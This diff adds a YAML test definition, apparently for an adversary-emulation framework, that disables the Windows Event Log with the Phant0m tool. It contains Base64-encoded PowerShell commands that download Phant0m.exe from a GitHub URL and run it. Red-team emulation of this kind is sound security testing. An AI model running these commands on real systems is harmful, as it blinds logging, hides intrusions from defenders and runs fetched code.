@@ -1,0 +1,20 @@
+- id: db238757-4c1d-558b-8e9a-1872af57f5f4
+  name: Soumaia ART Tests - Makes Eventlog blind with Phant0m
+  description: Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.001
+    name: 'Disable or Modify Tools: Disable or Modify Windows Event Log'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFAAaABhAG4AdAAwAG0ALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABQAGgAYQBuAHQAMABtAC4AZQB4AGUAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA2ADgANQAuADAAMAAxAC8AYgBpAG4ALwBQAGgAYQBuAHQAMABtAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFAAaABhAG4AdAAwAG0ALgBlAHgAZQAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAKAA==
+          )
+          ".\Phant0m.exe"
+        cleanup: |-
+          echo "Sorry you have to reboot"
+        payloads:
+        - Phant0m.exe
